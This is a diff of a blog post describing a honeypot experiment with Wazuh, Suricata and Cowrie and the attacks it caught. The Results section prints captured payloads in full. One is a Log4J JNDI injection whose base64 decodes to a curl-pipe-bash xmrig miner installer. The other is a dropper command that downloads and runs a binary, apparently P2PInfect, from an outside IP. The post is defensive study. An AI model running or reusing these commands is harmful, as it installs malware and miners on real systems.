@@ -13,7 +13,7 @@ Regarding point 2. I decided to use Suricata which is a IDS/IPS solution, theref
 
 I didn't plan to use an SSH honeypot in the first place, but after some trials, I thought it may be a good idea to make the server more attractive for the bad guys. After trying a bunch of open-source projects, I went with Cowrie.
 
-(All artifacts and tool configurations can be found on the repo: )
+(All artifacts and tool configurations can be found on the repo: https://github.com/lorenzodegiorgi/Honeypot-Results.git)
 
 ### Infrastructure Design
 I used cloud provider to setup 2 VMs: the first one hosted the web server and it is equipped with Wazuh agent, which monitor the system. Moreover, Suricata has been installed and setup to alert if web server is asked for weird content. Obviously, this one is Internet facing.
@@ -27,7 +27,7 @@ The application is very simple. It has been written mainly in Javascript, using 
 In this test, I deployed Wazuh agent on the web server and Wazuh console. Basically, the agent monitor the hosts, looking for suspicious actions and sends notifications to Wazuh console. Wazuh offers different features to detect malicious actions, but it needs to be properly configured.
 Among the different features that can be enabled on Wazuh, I decide to try out the following:
 1. File Integroty Monitoring: features that checks some folder/file for changes. It is useful to figure out if sensitive folders has been hacked. Among the common folder (/usr, /bin, /etc), I included also the folder where Cowrie drop files downloaded by user connected via SSH.
-2. Integration with VirusTotal: VirusTotal is ... . I used the API key provided with free account to connect Wazuh with VirusTotal. This feature allows to automatically scan monitored folders once a change occurs. 
+2. Integration with VirusTotal: I used the API key provided with free account to connect Wazuh with VirusTotal. This feature allows to automatically scan monitored folders once a change occurs. 
 3. Enable hidden process detection: it allows to detects hidden processes created by rootkit.
 
 In addition, I decide to send to SIEM logs from additional sources:
@@ -50,20 +50,27 @@ I decide to set it up in order to allow login with any username/password after a
 ### Results
 After setting everything up, it's time to run it and wait for results. I run it for about 72 hours.
 Despite I would expected more iteractions with the application, actually some strange requests and command has been launch against the server. I believe that most of them were conducted by automatized bots, but I'm quite happy with that anyway.
+
+#### Some general statistics
 Below some statistics collected:
 
 {% include image.html url="/img/2024-01-09-Wazuh-and-Honeypot/command.png" description="Most used commands in SSH honeypot" %}
 
-{% include image.html url="/img/2024-01-09-Wazuh-and-Honeypot/suricata.png" description="Suricata traffic classification" %}
+{% include image.html url="/img/2024-01-09-Wazuh-and-Honeypot/connections.png" description="Locations of SSH attempts" %}
 
 {% include image.html url="/img/2024-01-09-Wazuh-and-Honeypot/user.png" description="Successfully logged users" %}
 
+#### Interesting traffic classification by Suricata
+{% include image.html url="/img/2024-01-09-Wazuh-and-Honeypot/suricata.png" description="Suricata traffic classification" %}
 
-Here the categorization of malicious traffics given by Suricata. I find some of them interesting:
+I find some classes interesting:
 - Attempted Administrator Privilege Gain. From Suricata it seems to be alerting against CVE_2018_11776. Details here: https://www.keysight.com/blogs/en/tech/nwvs/2022/06/03/strutting-to-remote-code-execution-anatomy-of-cve-2018-11776
 - Attempted User Privilege Gain. Even if detection is different, it seems to have the same aim (la prima appartiene a questo ruleset https://github.com/jpalanco/alienvault-ossim/blob/master/snort-rules-default-open/rules/2.9.2/emerging.rules/emerging-exploit.rules)
 
-There's has been also an attempt to drop a cryptominer via Log4J attack. On Christmas day, at 15:58 (Rome time) I receive the following request against the web server: (interessante sapere se è stato rilevato da Suricata, anche se encoded)
+#### Cryptominer via Log4J attack
+
+There's has been also an attempt to drop a cryptominer via Log4J attack. On Christmas day, I receive the following request against the web server: (interessante sapere se è stato rilevato da Suricata, anche se encoded)
+
 ```
 GET / HTTP/1.1" 200 3230 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//cdn.x4b.lol:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQzNQb29sL3htcmlnX3NldHVwL21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBiYXNoIC1zIDQ4Nnhxdzd5c1hkS3c3UmtWelQ1dGRTaUR0RTZzb3hVZFlhR2FHRTFHb2FDZHZCRjdyVmc1b01YTDlwRngzckIxV1VDWnJKdmQ2QUhNRldpcGVZdDVlRk5VeDlwbUdO}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//cdn.x4b.lol:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQzNQb29sL3htcmlnX3NldHVwL21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBiYXNoIC1zIDQ4Nnhxdzd5c1hkS3c3UmtWelQ1dGRTaUR0RTZzb3hVZFlhR2FHRTFHb2FDZHZCRjdyVmc1b01YTDlwRngzckIxV1VDWnJKdmQ2QUhNRldpcGVZdDVlRk5VeDlwbUdO}')"
 ```
@@ -77,6 +84,7 @@ curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3p
 
 "Unfortunately", I didn't use log4j and the attack didn't go well. Anyway, from the decoding string, it is possible to notice that the aim of the attack is to download "xmrig_setup", an opensource miner, and sent crypto to the attacker's wallet.
 
+#### Malware (P2PInfect?)
 As soon as I was loosing any hope to get something interesting, a curl command was launch in the honeypot:
 ```
 curl http://74.208.103.29:60116/linux -o /tmp/hhXx6VBudz; if [ ! -f /tmp/hhXx6VBudz ]; then wget http://74.208.103.29:60116/linux -O /tmp/hhXx6VBudz; fi; if [ ! -f /tmp/hhXx6VBudz ]; then exec 6<>/dev/tcp/74.208.103.29/60116 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/hhXx6VBudz && chmod +x /tmp/hhXx6VBudz && /tmp/hhXx6VBudz amUKy2H88jbv/3/NEHQcGX8IzH7/+CD2+mHODn0FGnUN0n33+zbx/37KHnEYBXQLymH/+S74+3XKDnQfHmUPxX/g8DTv/X3SB3ERHXUPyHbu9TPv/3rJEHQcE2sNxHX48THw/W/IDWsaGHEQznz87zj7+H/NDHALGHIQznz57zby4HrEBHMbGncH3Hn/7zH3/mHOD3YFGXYHxnn+8DL07nfSDHQTBXcNzGH/9DL7+H/ND3MLHXQQzXr67zHy9mHNDnIRHXUPyH3u8Dj04HjEEHQYGGsMz3/09zDw+nvcD3cYBXQLy2H5+C7y+nXKDnQfEmUKy2H/8TDv/WHOC3YRHXUPzH/u9TPv/3rJEHQdEmsLyXX48TH1/W/OD3QFGn0O0n3/+C7z/HvGCHUaG3Ieyn7g8DX24H7LCWsZGXwEyn//8jTh/3/EEHQTGmsPzn3g8zLw9HnMD3UaC3EL0n79+S7w+XvSD3wSEXMOzX754TL24H3ODWsZGGsIzXX48THz/m/ND3wFGn0G0n74+S7w+nrGCHUaH3EezX//7zP14H3PCGsaHncEyn//9Tfh/HzSB3EFGXYL0nf09zDw/HzcD3IbBXQOymH/9jTv/3jNBHMbGnUN3H388S7w+XbSD3wTBXcLxnn+8DH07nzLEHcYHGsMzHrg+DD7+H/NDHULE2sMzXjg8DTz4H7LCn8dG3QNyG/88zHv/3/SD3cfBXQKznX48THz+2/ED2sZGnEQzXz67zH09nXKDnQfE2UPzXbg8DPv9nfSDHEbEXMOzX/34TLz/mHNCHQFGncM0n3/8Tr3/n7OCxu4ApTkr8lQCGGraDz9MHV6; fi; echo password > /tmp/.opass; chmod +x /tmp/hhXx6VBudz && /tmp/hhXx6VBudz amUKy2H88jbv/3/NEHQcGX8IzH7/+CD2+mHODn0FGnUN0n33+zbx/37KHnEYBXQLymH/+S74+3XKDnQfHmUPxX/g8DTv/X3SB3ERHXUPyHbu9TPv/3rJEHQcE2sNxHX48THw/W/IDWsaGHEQznz87zj7+H/NDHALGHIQznz57zby4HrEBHMbGncH3Hn/7zH3/mHOD3YFGXYHxnn+8DL07nfSDHQTBXcNzGH/9DL7+H/ND3MLHXQQzXr67zHy9mHNDnIRHXUPyH3u8Dj04HjEEHQYGGsMz3/09zDw+nvcD3cYBXQLy2H5+C7y+nXKDnQfEmUKy2H/8TDv/WHOC3YRHXUPzH/u9TPv/3rJEHQdEmsLyXX48TH1/W/OD3QFGn0O0n3/+C7z/HvGCHUaG3Ieyn7g8DX24H7LCWsZGXwEyn//8jTh/3/EEHQTGmsPzn3g8zLw9HnMD3UaC3EL0n79+S7w+XvSD3wSEXMOzX754TL24H3ODWsZGGsIzXX48THz/m/ND3wFGn0G0n74+S7w+nrGCHUaH3EezX//7zP14H3PCGsaHncEyn//9Tfh/HzSB3EFGXYL0nf09zDw/HzcD3IbBXQOymH/9jTv/3jNBHMbGnUN3H388S7w+XbSD3wTBXcLxnn+8DH07nzLEHcYHGsMzHrg+DD7+H/NDHULE2sMzXjg8DTz4H7LCn8dG3QNyG/88zHv/3/SD3cfBXQKznX48THz+2/ED2sZGnEQzXz67zH09nXKDnQfE2UPzXbg8DPv9nfSDHEbEXMOzX/34TLz/mHNCHQFGncM0n3/8Tr3/n7OCxu4ApTkr8lQCGGraDz9MHV6 &
@@ -102,14 +110,17 @@ Ok, it may be useful but it still unclear the final goal of the script.
 I used "readelf" utility to get some static property of the files but it seems to be statically linked and stripped; it may not be so informative as I thought.
 In addition, a further scan with VirusTotal seems to categorize it as a "P2PInfect" malware: in a few words it's a malware which exploit a Redis vulnerability and then drop executable needed to join the host on a P2P network. Once joined, additional payloads are downloaded based on OS.(here a good explanation from Palo Alto Unit42: https://unit42.paloaltonetworks.com/peer-to-peer-worm-p2pinfect/).
 Out of curiosity, I setup a new VMs to investigate a little further and I started trace out syscall with "strace" (full output on Github). There are tons of suspicious calls like reading "/etc/shadow" and "/etc/passwd" or open new connections.
-About connections, looking at firewall logs (every inbound/outbound connections was blocked). I noticed that it started contacting different IP addresses (maybe other P2P nodes as Unit 42 article state)
+About connections, looking at firewall logs (every inbound/outbound connections was blocked). I noticed that it started contacting different IP addresses (maybe other P2P nodes as Unit 42 article state).
 
 After some research, I decided that this work require tons of time and ability, therefore I'll write a new post with a proper analysis.
 
-#### Conclusions
+#### Unknown Malware
+Someone attempt to drop a suspicious bash script on the server, via a strange request to the webserver (likely, trying to exploit some vulnerable app). Unfortunately I have not the time to do even basic analysis on it yet. Anyway, it is possible to found it in the repository cited previously.
+
+### Conclusions
 At the beginning, I had in mind different scenarios in which hackers would try to break my applications and reach the database. Instead I got a lot of likely bot-driven traffic and hacking attempts. At the end, it's also true that no hackers would have spent a lot of time breaking an application which probably doesn't worth it.
 Also, running the VMs for just 3 days didn't help.
-Anyway, I'm quite satisfied with the results, expecially with the proably "P2PInfect" malware which I look forward to analyze. Moreover, I really appreciate having the chance to use Wazuh which I would like to try for months.
+Anyway, I'm quite satisfied with the results, expecially with the proably "P2PInfect" malware which I look forward to analyze. I'm quite sure that it's possible to find out something more, digging in the logs. Moreover, I really appreciate having the chance to use Wazuh which I would like to try for months.
 
 ---
 
